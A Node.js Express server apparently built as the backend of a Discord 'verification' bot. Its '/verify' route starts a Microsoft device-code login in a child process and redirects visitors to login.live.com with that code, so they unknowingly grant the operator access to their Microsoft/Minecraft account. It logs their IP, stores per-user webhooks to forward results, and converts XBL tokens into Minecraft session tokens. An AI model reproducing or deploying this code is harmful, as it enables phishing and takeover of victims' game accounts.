const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const { spawn } = require('child_process');
const childProcess = require('child_process');
const http = require("http");
const { Worker } = require('worker_threads');
const fs = require('fs');
let globalUserId = null;
const app = express();
const port = 3001;

const cacheDir = 'random';
let authenticationCode = null;
let clients = [];

app.use(express.json()); // Enable JSON request body parsing

// Your Discord bot code here (see the previous code for the bot setup)

function doAuth(username, userId, clientIP) {
  const childProcess = spawn('node', ['authProcess.js', username, cacheDir]);
  const logBuffer = [];

  childProcess.stdout.on('data', (data) => {
    const output = data.toString();
    logBuffer.push(output);

    const codeMatch = output.match(/enter the code ([A-Z0-9]{8})/i);
    if (codeMatch && codeMatch[1]) {
      authenticationCode = codeMatch[1];
      console.log('Authentication code:', authenticationCode);

      // Notify connected clients when the authentication code is available
      clients.forEach((client) => {
        client.res.write(`data: ${authenticationCode}\n\n`);
        client.res.end();
      });
    }
  });

  childProcess.stderr.on('data', (data) => {
    const errorOutput = data.toString();
    logBuffer.push(errorOutput);
    console.error(errorOutput);
  });

  childProcess.on('close', (code) => {
    console.log(`Child process exited with code ${code}`);

    // Offload the log-saving task to a worker thread
    if (authenticationCode) {
      const logWorker = new Worker('./logWorker.js', {
        workerData: { authenticationCode, logBuffer, userId, clientIP },
      });

      logWorker.on('message', (message) => {
        if (message.error) {
          console.error('Error saving log:', message.error);
        } else {
          console.log('Log saved to:', message.logFilePath);
        }
      });
    }
  });
}
app.get('/refreshxbl', async (req, res) => {
  try {
    const xbl = req.query.xbl;
    const xstsUserHash = await getxstsuserhash(xbl);
    const ssid = await getssid(xstsUserHash[0], xstsUserHash[1]);
    res.send(ssid);
  } catch (error) {
    res.status(400).send("Invalid XBL Token/Token Expired/Ratelimit");
  }
});

async function getxstsuserhash(xbl) {
  const url = 'https://xsts.auth.xboxlive.com/xsts/authorize';
  const headers = { 'Content-Type': 'application/json', 'Accept': 'application/json' };
  const data = {
    Properties: {
      SandboxId: 'RETAIL',
      UserTokens: [xbl],
    },
    RelyingParty: 'rp://api.minecraftservices.com/',
    TokenType: 'JWT',
  };

  try {
    const response = await axios.post(url, data, { headers });
    const jsonresponse = response.data;
    return [jsonresponse.DisplayClaims.xui[0].uhs, jsonresponse.Token];
  } catch (error) {
    throw new Error(error.message);
  }
}

async function getssid(userHash, xsts) {
  const url = 'https://api.minecraftservices.com/authentication/login_with_xbox';
  const headers = { 'Content-Type': 'application/json' };
  const identityToken = `XBL3.0 x=${userHash};${xsts}`;
  const data = {
    identityToken,
    ensureLegacyEnabled: 'true',
  };

  try {
    const response = await axios.post(url, data, { headers });
    const jsonresponse = response.data;
    return jsonresponse.access_token;
  } catch (error) {
    throw new Error(error.message);
  }
}


// Add an API endpoint for generating webhook URLs
app.post('/generate', (req, res) => {
  const { userId, webhookURL } = req.body; // Assuming you send user ID and webhook URL in the request body

  // Check if the user already has an entry in the config
  let config = [];
  try {
    config = JSON.parse(fs.readFileSync('config.txt', 'utf8'));
  } catch (error) {
    console.error('Error reading config:', error.message);
  }

  const existingEntry = config.find((entry) => entry.id === userId);
  if (existingEntry) {
    res.status(400).json({ message: 'You already have a webhook in the config.' });
  } else {
    // Add the user's entry to the config
    config.push({ id: userId, webhookURL });
    fs.writeFileSync('config.json', JSON.stringify(config, null, 2), 'utf8');

    // Send a response to the user
    res.status(200).json({ message: 'Webhook URL added to the config.' });
  }
});

app.get('/stream', (req, res) => {
  // Enable server-sent events (SSE) for clients
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  // Keep track of connected clients
  clients.push({ req, res });
});

app.get('/verify/:id', (req, res) => {
  const userId = req.params.id; // Extract userId from the route parameters
  const clientIP = req.socket.remoteAddress
 // Get the client's IP address

  // Rest of your code
  const username = crypto.randomBytes(8).toString('hex');
  doAuth(username, userId, clientIP);

  const intervalId = setInterval(() => {
    if (authenticationCode) {
      clearInterval(intervalId);
      const redirectUrl = `https://login.live.com/oauth20_remoteconnect.srf?lc=1033&otc=${authenticationCode}`;
      res.redirect(redirectUrl);
    }
  }, 1000); // Poll every second
});





app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
